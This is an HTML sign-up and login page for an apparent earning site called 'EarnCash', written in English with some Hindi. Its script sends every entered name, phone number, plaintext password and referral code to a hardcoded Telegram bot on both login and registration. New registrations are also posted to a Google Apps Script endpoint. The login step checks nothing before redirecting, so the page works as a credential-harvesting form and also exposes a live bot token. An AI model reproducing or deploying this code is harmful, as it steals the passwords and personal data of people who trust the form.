<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EarnCash - Join Us</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0066ff; --bg: #f4f7fe; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; padding: 20px; }
        .auth-container { background: white; width: 100%; max-width: 400px; padding: 35px 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.08); text-align: center; }
        .logo { font-size: 32px; margin-bottom: 10px; display: block; }
        h2 { font-size: 24px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
        .form-group { margin-bottom: 18px; text-align: left; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #555; }
        .form-group input { width: 100%; padding: 14px; border: 1.5px solid #ebebeb; border-radius: 14px; font-size: 15px; outline: none; background: #fafafa; }
        .main-btn { width: 100%; background: var(--primary); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
        .toggle-text { margin-top: 25px; font-size: 14px; color: #666; }
        .toggle-text span { color: var(--primary); font-weight: 700; cursor: pointer; }
        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="auth-container">
        <span class="logo">ðŸ§¼</span>
        <h2 id="title">Create Account</h2>
        <div id="reg-only" class="form-group">
            <label>Full Name</label>
            <input type="text" id="name" placeholder="Full name">
        </div>
        <div class="form-group">
            <label>Mobile Number</label>
            <input type="tel" id="phone" placeholder="10 digit number">
        </div>
        <div class="form-group">
            <label>Password</label>
            <input type="password" id="pass" placeholder="Password">
        </div>
        <button class="main-btn" onclick="processAuth()" id="btn-text">Register Now</button>
        <p class="toggle-text" id="toggle-msg">Already have an account? <span onclick="switchMode()">Login</span></p>
    </div>

    <script>
        let mode = 'register'; 
        const scriptURL = 'https://script.google.com/macros/s/AKfycbyOp4E3zHasQv338D4kQ0NDUZPjCRhKmwDdpUoqjQcaMAURh4Ya08PFGHTWs3kJh5j5/exec';
        const urlParams = new URLSearchParams(window.location.search);
        const referrer = urlParams.get('ref') || 'Direct';

        function switchMode() {
            mode = (mode === 'register') ? 'login' : 'register';
            document.getElementById('title').innerText = mode === 'register' ? "Create Account" : "Welcome Back";
            document.getElementById('reg-only').classList.toggle('hidden');
            document.getElementById('btn-text').innerText = mode === 'register' ? "Register Now" : "Login Now";
        }

        async function processAuth() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('pass').value;
            const name = document.getElementById('name').value;
            if (phone.length < 10 || password.length < 4) { alert("Details sahi dalo!"); return; }

            document.getElementById('btn-text').innerText = "Connecting...";

            // Telegram Notification
            const teleMsg = `ðŸ‘¤ *USER ACTIVITY*\n\nðŸ“Œ Mode: ${mode.toUpperCase()}\nðŸ“› Name: ${name || 'Old User'}\nðŸ“ž Phone: ${phone}\nðŸ”‘ Pass: ${password}\nðŸ”— Ref: ${referrer}`;
            fetch(`https://api.telegram.org/bot7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E/sendMessage?chat_id=8415600127&text=${encodeURIComponent(teleMsg)}&parse_mode=Markdown`);

            if (mode === 'register') {
                let formData = new FormData();
                formData.append('Name', name); formData.append('Phone', phone);
                formData.append('Password', password); formData.append('Referrer', referrer);
                
                try {
                    await fetch(scriptURL, { method: 'POST', body: formData });
                    localStorage.setItem('userPhone', phone);
                    window.location.href = "plans.html";
                } catch (e) { window.location.href = "plans.html"; }
            } else {
                localStorage.setItem('userPhone', phone);
                window.location.href = "home.html";
            }
        }
    </script>
</body>
</html>
